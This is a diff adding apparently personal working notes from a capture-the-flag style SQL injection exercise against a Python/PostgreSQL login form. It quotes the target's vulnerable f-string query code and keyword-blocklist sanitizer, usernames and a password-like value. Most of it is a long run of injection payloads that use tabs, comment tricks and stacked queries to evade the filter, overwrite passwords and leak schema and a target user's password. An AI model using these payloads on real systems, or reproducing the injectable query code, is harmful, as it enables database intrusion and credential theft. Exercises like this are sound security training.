@@ -1,0 +1,164 @@
+Logins:
+
+icevin_6e353b
+
+john_doe
+
+'OR(1=1)OR'a'='
+
+password: 1g1Igj5Am2sfObgyw_kZk0OIABw=
+
+noam_chomsky
+n o a m _ c h o m s k y
+
+
+non-ascii chars
+
+
+
+Sending a POST request with a single quote ' as the username returns the following SQL error:
+
+(psycopg2.errors.SyntaxError) unterminated quoted string at or near "'''"
+LINE 1: SELECT * FROM "user" WHERE username='''
+                                            ^
+
+[SQL: SELECT * FROM "user" WHERE username=''']
+(Background on this error at: http://sqlalche.me/e/13/f405)
+
+
+SELECT * FROM "user" WHERE username=''OR(1=1)OR'a'=''
+
+
+     TODO: re-write all of this intern's garbage code  
+     TODO: make sure table column names are randomized correctly 
+    """       
+           
+            login_username = request.form["username"]       
+            success, result = perform_query(conn, f"SELECT * FROM \"user\" WHERE username='{sanitize_query(login_username)}';")
+            if not success:
+                return result
+            if len(result) == 0 or len(result[0]) == 0:
+                return "User not found"
+            result = result[0]
+
+
+def home(username):
+    success, result = perform_query(conn, f"select * from \"user\" where username='{sanitize_query(login_username)}';")
+    if not success:
+        return result
+    print(f"USER: {result}")
+    success, result = perform_query(conn, f"select year from \"user\" where username='{sanitize_query(login_username)}';")
+    if not success:
+        print("Year not found!")
+        return result
+
+
+def sanitize_query(query):
+    # invalidate queries containing these words
+    danger_words = [" drop ", " delete ", "information_schema.tables", "information_schema.columns", "information_schema.schemata","noam_chomsky"]
+    for word in danger_words:
+        if word in query:
+            return False
+    query = query.replace(" ", "")
+    query = query.replace("%20", "")
+    query = query.replace("'", "")
+    query = query.encode("ascii").decode("utf-8")
+    print(query)
+    return query
+
+
+
+    'OR(1=1);SELECT*FROM/**/INF ORMATION_SC HEMA.TABLES;'a'='
+
+'OR(1=1);SELECT*FROM/**/INF ORMATION_SC HEMA.TABLES;print'a
+
+'OR(1=1);SELECT*FROM/**/INF ORMATION_SC HEMA.TABLES;'
+
+
+'OR(1=1);UPDATE/**/'user'/**/SET/**/password='hi
+'OR(1=1);UPDATE('user')SET()password='hi
+
+'OR(1=1);SELECT		*		FROM	INFORMATION_SCHEMA.TABLES;UPDATE		"user"		SET		login_password='hi'	WHERE	username='noa m_c homsky
+
+
+
+
+'OR(1=1);SELECT		column_name		FROM		INFORMATION_SCHEMA.COLUMNS		WHERE		table_name =		"user";SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);
+
+SELECT		*		FROM		"user"		WHERE		false
+
+SELECT	*	FROM	"user"	WHERE	username='	
+
+
+'OR(1=1);SELECT		*		FROM		"user"		WHERE		false;SELECT	*	FROM	"user"	WHERE	username='	
+
+
+'OR(1=1);UPDATE	user	SET	year	=	(SELECT	column_name	FROM	information_schema.columns	WHERE	table_name='user'	);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);
+
+SELECT	column_name	FROM	information_schema.columns	WHERE	table_name='user';
+
+SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);SELECT	column_name	FROM	information_schema.columns	WHERE	table_name="user";SELECT	*	FROM	"user"	WHERE	username='
+
+
+
+'OR(1=1);
+UPDATE	user	SET	year	=	(SELECT	column_name	FROM	information_schema.columns	WHERE	table_name='user'	) WHERE username='john_doe';
+SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	table_name	FROM	informati on_schema.tables	WHERE	table_schema	=	'public');SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+
+
+'OR(1=1);UPDATE	user	SET	year	=	(show	tables);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	table_name	FROM	informa tion_schema.tables	WHERE	table_schema	=	'public'	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	table_name	FROM	informa tion_schema.tables	WHERE	table_schema	=	'public'	OFFSET	0	ROWS	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+
+
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	column_name	FROM	informa tion_schema.columns	WHERE	table_name	=	'grade'	OFFSET	0	ROWS	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	column_name	FROM	informa tion_schema.columns	WHERE	table_name	=	'grade'	OFFSET	6	ROWS	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+
+
+
+
+
+
+
+password_1ef45a6a
+
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	column_name	FROM	informa tion_schema.columns	WHERE	table_name	=	'user'	OFFSET	0	ROWS	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
+
+
+
+'OR(1=1);UPDATE	"user"	SET	year	=	(SELECT	password_1ef45a6a	FROM	"user"	WHERE	username	=	'noa m_chomsky'	OFFSET	0	ROWS	LIMIT	1);SELECT	*	FROM	"user"	WHERE	username='	
